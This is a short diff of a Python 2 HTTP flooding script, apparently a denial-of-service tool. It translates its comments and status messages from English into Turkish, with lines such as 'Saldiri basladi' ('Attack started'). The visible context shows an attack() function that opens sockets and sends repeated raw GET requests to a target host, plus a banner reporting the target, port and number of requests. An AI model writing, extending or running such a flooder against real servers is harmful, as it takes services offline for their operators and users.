@@ -7,7 +7,7 @@ import sys
 import threading
 import time
 
-# Parse inputs
+# Argumanları al
 host = ""
 ip = ""
 port = 0
@@ -72,14 +72,14 @@ def attack():
 
         dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
     except socket.error, e:
-        print "\n [ No connection, server may be down ]: " + str(e)
+        print "\n [ Server cokmus olabilir. ]: " + str(e)
     finally:
 
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
+print "[#] Saldiri basladi: " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
 
 
 all_threads = []
